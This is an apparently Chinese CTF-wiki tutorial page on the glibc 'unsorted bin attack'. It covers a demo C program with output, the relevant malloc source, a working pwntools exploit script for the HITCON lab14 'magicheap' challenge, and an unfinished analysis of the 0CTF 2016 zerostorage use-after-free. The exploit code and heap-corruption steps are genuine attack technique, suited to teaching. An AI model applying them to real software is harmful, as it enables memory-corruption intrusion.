---
typora-root-url: ../../../docs
---

# Unsorted Bin Attack

## 概述

Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。

Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。

Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。

## Unsorted Bin 回顾

在介绍 Unsorted Bin 攻击前，可以先回顾一下 Unsorted Bin 的基本来源以及基本使用情况。

### 基本来源

1. 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2. 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。
3. 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。

### 基本使用情况

1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。

## 原理

这里我以 shellphish 的 how2heap 仓库中的 [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) 为例进行介绍，这里我做一些简单的修改，如下

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  fprintf(stderr, "This file demonstrates unsorted bin attack by write a large "
                  "unsigned long value into stack\n");
  fprintf(
      stderr,
      "In practice, unsorted bin attack is generally prepared for further "
      "attacks, such as rewriting the "
      "global variable global_max_fast in libc for further fastbin attack\n\n");

  unsigned long target_var = 0;
  fprintf(stderr,
          "Let's first look at the target we want to rewrite on stack:\n");
  fprintf(stderr, "%p: %ld\n\n", &target_var, target_var);

  unsigned long *p = malloc(400);
  fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",
          p);
  fprintf(stderr, "And allocate another normal chunk in order to avoid "
                  "consolidating the top chunk with"
                  "the first one during the free()\n\n");
  malloc(500);

  free(p);
  fprintf(stderr, "We free the first chunk now and it will be inserted in the "
                  "unsorted bin with its bk pointer "
                  "point to %p\n",
          (void *)p[1]);

  /*------------VULNERABILITY-----------*/

  p[1] = (unsigned long)(&target_var - 2);
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the "
                  "victim->bk pointer\n");
  fprintf(stderr, "And we write it with the target address-16 (in 32-bits "
                  "machine, it should be target address-8):%p\n\n",
          (void *)p[1]);

  //------------------------------------

  malloc(400);
  fprintf(stderr, "Let's malloc again to get the chunk we just free. During "
                  "this time, target should has already been "
                  "rewrite:\n");
  fprintf(stderr, "%p: %p\n", &target_var, (void *)target_var);
}
```

程序执行后的效果为

```shell
➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
➜  unsorted_bin_attack git:(master) ✗ ./unsorted_bin_attack
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7ffe0d232518: 0

Now, we allocate first normal chunk on the heap at: 0x1fce010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。

![](./figure/unsorted_bin_attack_order.png)

**初始状态时**

unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。

**执行free(p)**

由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。

**修改p[1]**

经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。

**申请400大小的chunk**

此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去unsorted bin中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。

```c
        while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
            bck = victim->bk;
            if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) ||
                __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0))
                malloc_printerr(check_action, "malloc(): memory corruption",
                                chunk2mem(victim), av);
            size = chunksize(victim);

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */
			/* 显然，bck被修改，并不符合这里的要求*/
            if (in_smallbin_range(nb) && bck == unsorted_chunks(av) &&
                victim == av->last_remainder &&
                (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) {
				....
            }

            /* remove from unsorted list */
            unsorted_chunks(av)->bk = bck;
            bck->fd                 = unsorted_chunks(av);
```

- victim = unsorted_chunks(av)->bk=p
- bck = victim->bk=p->bk = target addr-16
- unsorted_chunks(av)->bk = bck=target addr-16
- bck->fd                 = *(target addr -16+16) = unsorted_chunks(av);

**可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。**然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。

即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。

```shell
We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。**而且，需要注意的是，**

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说

- 我们通过修改循环的次数来使得程序可以执行多次循环。
- 我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack了。

## HITCON Training lab14 magic heap
[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14)

这里我们修改一下源程序中的 l33t 函数，以便于可以正常运行。

```c
void l33t() { system("cat ./flag"); }
```

### 基本信息

```shell
➜  hitcontraining_lab14 git:(master) file magicheap
magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped
➜  hitcontraining_lab14 git:(master) checksec magicheap
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出，该程序是一个动态链接的64程序，主要开启了 NX 保护与 Canary 保护。

### 基本功能

程序大概就是自己写的堆管理器，主要有以下功能

1. 创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。
2. 编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里其实就出现了任意长度堆溢出的漏洞。
3. 删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。

同时，我们看到，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。

### 利用

很显然， 我们直接利用 unsorted bin attack 即可。

1. 释放一个堆块到 unsorted bin 中。
2. 利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &magic-16。
3. 触发漏洞即可。

代码如下

```Python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


create_heap(0x20, "dada")  # 0
create_heap(0x80, "dada")  # 1
# in order not to merge into top chunk
create_heap(0x20, "dada")  # 2

del_heap(1)

magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
create_heap(0x80, "dada")  #trigger unsorted bin attack
r.recvuntil(":")
r.sendline("4869")
r.interactive()

```

## 2016 0CTF zerostorage-待完成

**注：待进一步完成。**

这里我们以 2016 年 0CTF 的 [zerostorage](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/zerostorage) 为例，进行介绍。

**这个题当时给了服务器的系统版本和内核版本，所以自己可以下一个一模一样的进行调试，这里我们就直接用自己的本地机器调试了。但是在目前的Ubuntu 16.04 中，由于进一步的随机化，导致 libc 加载的位置与程序模块加载的位置之间的相对偏移不再固定，所以 BrieflyX 的策略就无法再次使用，似乎只能用 angelboy 的策略了。**

### 安全性检查

可以看出，该程序开启了所有的保护

```shell
pwndbg> checksec
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### 基本功能分析

程序管理在 bss 段的存储空间 storage ，具有插入，删除，合并，删除，查看，枚举，退出功能。这个storage的结构体如下

```text
00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
00000000                                         ; XREF: .bss:storage_list/r
00000000 use             dq ?
00000008 size            dq ?
00000010 xor_addr        dq ?
00000018 Storage         ends
```

#### insert-1

基本功能如下

1.  逐一查看 storage 数组，查找第一个未使用的元素，但是这个数组最大也就是32。
2.  读取storage 元素所需要存储内容的长度。
    -   如果长度不大于0，直接退出；
    -   否则如果申请的字节数小于128，那就设置为128；
    -   否则，如果申请的字节数不大于4096，那就设置为对应的数值；
    -   否则，设置为4096。
3.  使用 calloc 分配指定长度，注意 calloc 会初始化 chunk 为0。
4.  将 calloc 分配的内存地址与 bss 段的一个内存（初始时刻为一个随机数）进行抑或，得到一个新的内存地址。
5.  根据读取的storage的大小来读入内容。
6.  将对应的storage的大小以及存储内容的地址保存到对应的storage 元素中，并标记该元素处于可用状态。**但是，需要注意的是，这里记录的storage的大小是自己输入的大小！！！**
7.  递增 storage num的数量。

#### update-2

1.  如果没有任何存储，就直接返回。
2.  读入要更新的storage元素的id，如果id大于31或者目前处于不处于使用状态，说明不对，直接返回。
3.  读取**更新后**storage 元素所需要存储内容的长度。
    -   如果长度不大于0，直接退出；
    -   否则如果申请的字节数小于128，那就设置为128；
    -   否则，如果申请的字节数不大于4096，那就设置为对应的数值；
    -   否则，设置为4096。
4.  根据 bss 段对应的随机数获取原先storage 存储内容的地址，
5.  如果更新后所需的长度不等于更新前的长度，就使用realloc为其重新分配内存。
6.  再次读取数据，同时更新storage 元素。

#### merge-3

1. 如果正在使用的元素不大于1个，那么无法合并，直接退出即可。
2. 判断storage是否已经满了，如果不满，找出空闲的那一块。
3. 分别读取merge_from的id以及merge_to的id号，并进行相应大小以及使用状态的检测。
4. 根据最初用户输入的大小来计算两个 merge 到一起后所需要的空间，**如果不大于128，那就不会申请新的空间**，否则就申请相应大小的新的空间。
5. 依次将merge_to与merge_from的内容拷贝到相对应的位置。
6. **最后存储merge_from内容的内存地址被释放了，但并没有被置为NULL。同时，存放merge_to内容的内存地址并没有被释放，相应的storage的抑或后的地址只是被置为了NULL。**

**但是需要注意的是，，在merge的时候，并没有检测两个storage的ID是否相同。**

#### delete-4

1. 如果没有存储任何元素，那就直接返回。
2. 读取指定要修改的storage的元素的id，如果 id 大于32，就直接返回。
3. 如果 storage  的对应元素并不在使用状态，那么也同时返回。
4. 之后就是将元素对应的字段分别设置为NULL，并且释放对应的内存。

#### view-5

1. 如果没有存储任何元素，那就直接返回。
2. 读取指定要修改的storage的元素的id，如果 id 大于32，就直接返回。
3. 如果 storage  的对应元素并不在使用状态，那么也同时返回。
4. 输入对应的storage 的内容。

#### list-6

1. 如果没有存储任何元素，那就直接返回。
2. 读取指定要修改的storage的元素的id，如果 id 大于32，就直接返回。
3. 遍历所有正在使用的storage，输入其对应的下标以及对应storage的大小。

### 漏洞确定

通过这么简单的分析，我们可以 基本确定漏洞主要就是集中在insert操作与merge操作中，尤其是当我们merge两个较小size的storage时，会出现一些问题。

我们来具体分析一下，如果我们在insert过程中插入较小的size（比如8）的storage  A，那么，当我们进行merge时，假设我们选择merge的两个storage 都为A，那么此时程序会直接把就会直接把A的内容再添加到A的原有内容的后面，然后接着就会把A对应的存储数据部分的内存free掉，但是这并没有什么作用，因为A存储内容的地址被赋给了另外一个storage，当再访问merge 后的 storage B部分的内容时，由于B的存储数据部分的地址其实就是A对应的存储数据的地址，所以打印的就是A的数据部分的内容。但是，我们之前刚刚把A对应的内存释放掉，而A由于不在fast bin范围内，所以只会被放到unsorted bin中（而且此时只有一个），所以此时A的fd和bk都存放的是unsorted bin的一个基地址。

如果我们在merge之前曾经删除过一个storage C，那么在我们merge A后，A就会插在unsorted bin的双向链表的首部，所以其fd则是C对应的地址，bk则是unsorted bin的一个基地址。这样我们就可以直接泄露两个地址。

而且需要注意的是，我们还是可以去修改merge后的B的内容的，所以这其实就是个Use After Free。

### 利用流程

。。。。

## 题目

### 参考文献

- http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/
- https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage
- https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py
